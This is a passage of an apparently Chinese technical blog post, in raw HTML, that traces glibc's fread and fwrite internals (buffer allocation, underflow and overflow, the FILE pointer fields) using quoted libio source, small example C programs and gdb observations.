class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>      fp-&gt;_IO_read_ptr += want;<br>      want = <span class="hljs-number">0</span>;<br>    &#125;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)  # <span class="hljs-number">3</span>、输入缓冲区里有部分字符，但是没有达到fread的size需求，先把已有的拷贝至目标buff<br>        &#123;<br>          ...<br>          <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);<br>          s += have;<br><br>          want -= have;<br>          fp-&gt;_IO_read_ptr += have;<br>        &#125;<br><br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>          &amp;&amp; want &lt; (<span class="hljs-keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)  # <span class="hljs-number">4</span>、输入缓冲区里不能满足需求，调用__underflow读入数据<br>         <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">continue</span>;<br>        &#125;<br>      ...<br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br>libc_hidden_def (_IO_file_xsgetn)<br></code></pre></td></tr></table></figure><p>​    接下来对_IO_file_xsgetn这三部分进行跟进并分析。</p><p>​    首先在fp-&gt;_IO_buf_base为空时，也就是输入缓冲区未建立时，代码调用_IO_doallocbuf去建立输入缓冲区。跟进_IO_doallocbuf函数，看下它是如何初始化缓冲区的，为输入缓冲区分配空间的，文件在/libio/genops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_doallocbuf (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base) # 如果输入缓冲区不为空，直接返回<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="hljs-number">0</span>) # 检查标志位<br>    <span class="hljs-keyword">if</span> (_IO_DOALLOCATE (fp) != EOF) # 调用vtable函数<br>      <span class="hljs-keyword">return</span>;<br>  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br>libc_hidden_def (_IO_doallocbuf)<br></code></pre></td></tr></table></figure><p>​    函数首先检查fp-&gt;_IO_buf_base是否为空，如果不为空表明该输入缓冲区已被初始化，那么直接返回。如果为空，则检查fp-&gt;_flags看它是不是_IO_UNBUFFERED或者fp-&gt;_mode大于0，如果满足条件则调用FILE的vtable中的_IO_file_doallocate，跟进该函数，在/libio/filedoalloc.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_file_doallocate (_IO_FILE *fp)<br>&#123;<br>  _IO_size_t size;<br>  <span class="hljs-keyword">char</span> *p;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat64</span> <span class="hljs-title">st</span>;</span><br><br>  ...<br>  size = _IO_BUFSIZ;<br>  ...<br>  <span class="hljs-keyword">if</span> (fp-&gt;_fileno &gt;= <span class="hljs-number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="hljs-number">0</span>) &gt;= <span class="hljs-number">0</span>) # 调用_IO_SYSSTAT获取FILE信息<br>   &#123;<br>     ... <br>     <span class="hljs-keyword">if</span> (st.st_blksize &gt; <span class="hljs-number">0</span>)<br>         size = st.st_blksize;<br>     ...<br>   &#125;<br> p = <span class="hljs-built_in">malloc</span> (size);<br> ...<br> _IO_setb (fp, p, p + size, <span class="hljs-number">1</span>); # 调用_IO_setb设置FILE缓冲区<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>libc_hidden_def (_IO_file_doallocate)<br></code></pre></td></tr></table></figure><p>​    可以看到_IO_file_doallocate函数是分配输入缓冲区的实现函数，首先调用_IO_SYSSTAT去获取文件信息，_IO_SYSSTAT函数是vtable中的__stat函数。获取文件信息，修改相应需要申请的size。可以看到在执行完_IO_SYSSTAT函数后，st结构体的值为下图所示。</p><p> <img src="https://s2.loli.net/2021/12/26/Cv6tyOnY9WMSKHR.png"></p><p>​    因此size被修改为st.st_blksize所对应大小的4096即0x1000，接着调用malloc去申请内存，申请出来的堆块如下图所示。</p><p> <img src="https://s2.loli.net/2021/12/26/5bSZPQxUIfYrMT2.png"></p><p>​    空间申请出来后，调用_IO_setb，跟进去看它干了些啥，文件在/libio/genops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_setb (_IO_FILE *f, <span class="hljs-keyword">char</span> *b, <span class="hljs-keyword">char</span> *eb, <span class="hljs-keyword">int</span> a)<br>&#123;<br>  ...<br>  f-&gt;_IO_buf_base = b; # 设置_IO_buf_base <br>  f-&gt;_IO_buf_end = eb; # 设置_IO_buf_end<br>  ...<br>&#125;<br>libc_hidden_def (_IO_setb)<br></code></pre></td></tr></table></figure><p>​    函数逻辑比较简单，就是设置了_IO_buf_base和_IO_buf_end，那么在IO_setb执行完之后，fp的这两个指针被赋上了值。</p><p> <img src="https://s2.loli.net/2021/12/26/tDAzaSwm8HE2j9B.png"></p><p>​    到此，初始化缓冲区就完成了，函数返回_IO_file_doallocate后，接着_IO_file_doallocate也返回，回到_IO_file_xsgetn函数中。</p><p>​    接下来程序也就进入到了第二部分，拷贝输入缓冲区数据，如果输入缓冲区存在已输入的数据，则把它直接拷贝到目标缓冲区里。</p><p>​    需要说明下的是从这里可以看出来fp-&gt;_IO_read_ptr指向的是输入缓冲区的起始地址，fp-&gt;_IO_read_end指向的是输入缓冲区的结束地址。</p><p>​    将fp-&gt;_IO_read_ptr到fp-&gt;_IO_read_end之间的数据通过memcpy拷贝到目标缓冲区中。</p><p>​    在输入缓冲区为0或者是不能满足需求的时候则会执行到最后一步__underflow去执行系统调用read读取数据，并放入到输入缓冲区里。因为我们的这个示例程序是第一次读取数据，此时的fp-&gt;_IO_read_end和fp-&gt;_IO_read_ptr都是0，因此会进入到__underflow，跟进去细看，文件在/libio/genops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>__underflow (_IO_FILE *fp)<br>&#123;<br><br>  # 额外的检查<br>  ...<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *) fp-&gt;_IO_read_ptr;<br>  ...<br>  # 调用_IO_UNDERFLOW<br>  <span class="hljs-keyword">return</span> _IO_UNDERFLOW (fp);<br>&#125;<br>libc_hidden_def (__underflow)<br></code></pre></td></tr></table></figure><p>​    函数稍微做一些检查就会调用_IO_UNDERFLOW函数，其中一个检查是如果fp-&gt;_IO_read_ptr小于fp-&gt;_IO_read_end则表明输入缓冲区里存在数据，可直接返回，否则表示需要继续读入数据。该函数是FILE结构体vtable里的_IO_new_file_underflow，跟进去看文件在/libio/fileops.c。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>_IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br>  ...<br>  # 如果存在_IO_NO_READS标志，则直接返回<br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  # 如果输入缓冲区里存在数据，则直接返回<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *) fp-&gt;_IO_read_ptr;<br>  ...<br>  ## 如果没有输入缓冲区，则调用_IO_doallocbuf分配输入缓冲区<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>      _IO_doallocbuf (fp);<br>    &#125;<br>  ...<br>  # 设置FILE结构体指针<br>  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end<br>    = fp-&gt;_IO_buf_base;<br>  # 调用_IO_SYSREAD函数最终执行系统调用读取数据<br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  ...<br>  # 设置结构体指针<br>  fp-&gt;_IO_read_end += count;<br>  ...<br>  <span class="hljs-keyword">return</span> *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *) fp-&gt;_IO_read_ptr;<br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure><p>​    这个<code>_IO_new_file_underflow</code>函数，是最终调用系统调用的地方，在最终执行系统调用之前，仍然有一些检查，整个流程为：</p><ol><li><p>检查FILE结构体的_flag标志位是否包含_IO_NO_READS，如果存在这个标志位则直接返回EOF，其中_IO_NO_READS标志位的定义是#define _IO_NO_READS 4 /* Reading not allowed */。</p></li><li><p>如果fp-&gt;_IO_buf_base为NULL，则调用_IO_doallocbuf分配输入缓冲区。</p></li><li><p>接着初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base</p></li><li><p>调用_IO_SYSREAD（vtable中的_IO_file_read函数），该函数最终执行系统调用read，读取文件数据，数据读入到fp-&gt;_IO_buf_base中，读入大小为输入缓冲区的大小fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base。</p></li><li><p>设置输入缓冲区已有数据的size，即设置fp-&gt;_IO_read_end为fp-&gt;_IO_read_end += count。</p></li></ol><p>​    其中第二步里面的如果<code>fp-&gt;_IO_buf_base</code>为NULL，则调用<code>_IO_doallocbuf</code>分配输入缓冲区。</p><p>​    其中第四步的<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数）的源码比较简单，就是执行系统调用函数read去读取文件数据，文件在<code>libio/fileops.c</code>，源码如下：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_ssize_t<br>_IO_file_read (_IO_FILE *fp, <span class="hljs-keyword">void</span> *buf, _IO_ssize_t size)<br>&#123;<br>   <span class="hljs-keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="hljs-number">0</span>)<br>           ? read_not_cancel (fp-&gt;_fileno, buf, size)<br>           : read (fp-&gt;_fileno, buf, size));<br> &#125;<br></code></pre></td></tr></table></figure><p>​    _IO_file_underflow函数执行完毕以后，FILE结构体中各个指针已被赋值，且文件数据已读入，输入缓冲区里已经有数据，结构体值如下，其中fp-&gt;_IO_read_ptr指向输入缓冲区数据的开始位置，fp-&gt;_IO_read_end指向输入缓冲区数据结束的位置：</p><p>​     <img src="https://s2.loli.net/2021/12/26/GrAQnMTVkxZv1DE.png"></p><p>   函数执行完，返回到_IO_file_xsgetn函数中，由于while循环的存在，重新执行第二部分，此时将输入缓冲区拷贝到目标缓冲区，最终返回。</p><p>​    至此，对于fread的源码分析结束。、</p><h2 id="IO-FILE之fwrite"><a href="#IO-FILE之fwrite" class="headerlink" title="IO_FILE之fwrite"></a>IO_FILE之fwrite</h2><p>​    在开始上源码之前，还是将fwrite的总体流程先描述一遍，好让大家有个大概的概念。</p><p>​    fwrite函数的总体流程图如下。</p><p> <img src="https://s2.loli.net/2021/12/26/KujHW2QvEyMemSg.png"></p><p>   fwrite的主要实现在_IO_new_file_xsputn中，整体流程包含四个部分。</p><ol><li><p>首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝到输出缓冲区。</p></li><li><p>如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用_IO_OVERFLOW建立输出缓冲区或刷新输出缓冲区。</p></li><li><p>输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size，如果超过块的size，则不通过输出缓冲区直接以块为单位，使用sys_write输出目标数据。</p></li><li><p>如果按块输出数据后还剩一点数据则调用_IO_default_xsputn将数据拷贝到输出缓冲区。</p></li></ol><p>​    接着介绍一下其中涉及的几个IO_FILE结构体的指针。</p><table><thead><tr><th>指针</th><th>描述</th></tr></thead><tbody><tr><td>_IO_buf_base</td><td>输入输出缓冲区基地址</td></tr><tr><td>_IO_buf_end</td><td>输入输出缓冲区结束地址</td></tr><tr><td>_IO_write_base</td><td>输出缓冲区基地址</td></tr><tr><td>_IO_write_ptr</td><td>输入缓冲区当前地址</td></tr><tr><td>_IO_write_end</td><td>输出缓冲区结束地址</td></tr></tbody></table><p>​    其中_IO_buf_base和_IO_buf_end是缓冲区建立函数_IO_doallocbuf（上小结详细描述过）会在里面建立输入输出缓冲区，并把基地址保存在_IO_buf_base中，结束地址保存在_IO_buf_end中。在建立输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址给_IO_write_base，结束地址给_IO_write_end，同时_IO_write_ptr表示为已经使用的地址。即_IO_write_base到_IO_write_ptr之间的空间是已经使用的缓冲区，_IO_write_ptr到_IO_write_end之间为剩余的输出缓冲区。</p><p>​    fwrite函数的原型</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">fwrite</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *ptr, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">size_t</span> nmemb, FILE *stream)</span></span><br><span class="hljs-function"><span class="hljs-meta"># ptr-- 这是指向要被写入的元素数组的指针。</span></span><br><span class="hljs-function"><span class="hljs-meta"># size-- 这是要被写入的每个元素的大小，以字节为单位。</span></span><br><span class="hljs-function"><span class="hljs-meta"># nmemb-- 这是元素的个数，每个元素的大小为 size 字节。</span></span><br><span class="hljs-function"><span class="hljs-meta"># stream-- 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输出流。</span></span><br></code></pre></td></tr></table></figure><p>首先仍然是一个示例程序。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    FILE* fp = fopen(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">char</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    fwrite(ptr, <span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>, fp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>​    编译完成之后，使用gdb进行调试，在fwrite处下断点。看到程序首先断在_IO_fwrite处。</p><p> <img src="https://s2.loli.net/2021/12/26/uQrT7OdNJlczC46.png"></p><p>​    在开始调试之前，还是先把传入的IO_FILE的fp值看一下，如下图所示。</p><p> <img src="https://s2.loli.net/2021/12/26/4WGI3YTQohOZFUA.png"></p><p>​    此时vtable中的内容如下图。</p><p> <img src="https://s2.loli.net/2021/12/26/hjfNVwrtYxXJQuq.png"></p><p>​    从图中可以看出刚经过fopen初始化，输入输出缓冲区没有建立，此时所有指针都为空。_IO_fwrite函数在文件/libio/iofwrite.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_fwrite (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t request = size * count;<br>  ...<br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span> || _IO_fwide (fp, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>)<br>    written = _IO_sputn (fp, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *) buf, request);<br>  ...<br>&#125;<br>libc_hidden_def (_IO_fwrite)<br></code></pre></td></tr></table></figure><p>​    没有做过多操作就调用了_IOsputn函数，该函数是vtable中的__xsputn(_IO_new_file_xsputn)在文件/libio/fileops.c中。源码分析从四个部分进行，其中下面每部分代码都是_IO_new_file_xsputn函数中的源码。</p><p>​    第一部分所包含的代码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *data, _IO_size_t n)<br>&#123; <br><br>    _IO_size_t count = <span class="hljs-number">0</span>;<br>...<br>    # 判断输出缓冲区还有多少空间<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)<br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="hljs-comment">/* Space available. */</span><br><br>  # 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>  count = to_do;<br>  ...<br>      <span class="hljs-built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);<br>      f-&gt;_IO_write_ptr += count;<br>    # 计算是否还有目标输出数据剩余<br>      s += count;<br>      to_do -= count;<br></code></pre></td></tr></table></figure><p>​    主要功能就是判断输出缓冲区还有多少空间，其中像示例程序所示的f-&gt;_IO_write_end以及f-&gt;_IO_write_ptr均为0，此时的输出缓冲区为0。</p><p>​    另一部分则是如果输出缓冲区仍有剩余空间的话，则将目标输出数据拷贝至输出缓冲区，并计算在输出缓冲区填满后，是否仍然剩余目标输出数据。</p><p>​    第二部分代码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"># 如果还有目标数据剩余，此时则表明输出缓冲区未建立或输出缓冲区已经满了<br><span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    _IO_size_t block_size, do_write;<br>    # 函数实现清空输出缓冲区或建立缓冲区的功能<br>    <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)<br><br><span class="hljs-keyword">return</span> to_do == <span class="hljs-number">0</span> ? EOF : n - to_do;<br><br>    # 检查输出数据是否是大块<br>    block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;<br>    do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>​    经过了上一步骤，如果还有目标输出数据，表明输出缓冲区未建立或输出缓冲区已经满了，此时调用_IO_OVERFLOW函数。该函数功能主要是实现刷新输出缓冲区或建立缓冲区，它就是vtable中的__overlfow（_IO_new_file_overflow），文件在/libio/fileops.c中。</p><p> <img src="https://s2.loli.net/2021/12/26/SOG8YhKltEMovQm.png"></p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>_IO_new_file_overflow (_IO_FILE *f, <span class="hljs-keyword">int</span> ch)<br>&#123;<br>  # 判断标志位是否包含<span class="hljs-function">_IO_NO_WRITES</span><br><span class="hljs-function">  <span class="hljs-title">if</span> <span class="hljs-params">(f-&gt;_flags &amp; _IO_NO_WRITES)</span> <span class="hljs-comment">/* SET ERROR */</span></span><br><span class="hljs-function">    </span>&#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <br>  # 判断输出缓冲区是否为空<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span> || f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Allocate a buffer if needed. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    # 分配输出缓冲区<br>    _IO_doallocbuf (f);<br>    _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);<br>  &#125;<br>     <br>     # 初始化指针<br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)<br>  f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;<br>      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;<br>      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;<br>      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;<br>      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;<br><br>      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      <span class="hljs-keyword">if</span> (f-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>  f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;<br>    &#125;<br>   <br>  # 输出输出缓冲区 <br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>       f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF) #<span class="hljs-meta"># </span><br><span class="hljs-meta">      return EOF;</span><br>  *f-&gt;_IO_write_ptr++ = ch;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)<br>      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="hljs-string">&#x27;\n&#x27;</span>))<br>    <span class="hljs-keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,<br>          f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>) ch;<br>&#125;<br>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)<br></code></pre></td></tr></table></figure><p>​    __overflow函数首先检测_IO_FILE的flags是否包含_IO_NO_WRITES标志位，如果包含的话直接返回。</p><p>​    接着判断f-&gt;_IO_write_base是否为空，如果为空表明输出缓冲区尚未建立，就调用_IO_doallocbuf函数去分配输出缓冲区，_IO_doallocbuf函数源码在上小节fread中已经分析过了，就不继续跟进分析了，总结下它功能就是分配输出输出缓冲区并将指针_IO_buf_base和_IO_buf_end赋值。</p><p>​    在执行_IO_doallocbuf分配完空间后调用_IO_setg宏，该宏的定义如下，它将输出相关的缓冲区指针赋值为_IO_buf_base指针。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),</span><br>(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))<br></code></pre></td></tr></table></figure><p>​    经过上面这些步骤，此时IO_FILE的指针如下图所示。可以看到_IO_buf_base和_IO_buf_end被赋值了，且输出相关缓冲区指针被赋值为_IO_buf_base。</p><p> <img src="https://s2.loli.net/2021/12/26/sGvXUhu7ZLotd4R.png"></p><p>​    然后代码初始化其他相关指针，最主要的就是将f-&gt;_IO_write_base以及f-&gt;_IO_write_ptr设置成f-&gt;_IO_read_ptr指针；将f-&gt;_IO_write_end赋值为f-&gt;_IO_buf_end指针。</p><p>​    接着就执行_IO_do_write来调用系统调用write输出输出缓冲区，输出的内容为f-&gt;_IO_write_ptr到f-&gt;_IO_write_base之间的内容。跟进去该函数，函数在/libio/fileops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 